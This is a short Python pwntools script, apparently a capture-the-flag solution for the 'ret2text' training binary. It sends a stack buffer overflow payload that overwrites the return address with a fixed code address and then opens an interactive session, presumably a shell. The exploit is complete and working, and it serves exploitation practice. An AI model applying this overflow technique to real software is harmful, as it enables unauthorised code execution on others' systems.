#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug")

elf = ELF("./ret2text")
payload = fit({0x6c + 4: p32(0x0804863A)})

io = process("./ret2text")
io.sendlineafter("anything?\n", payload)
io.interactive()
io.close()
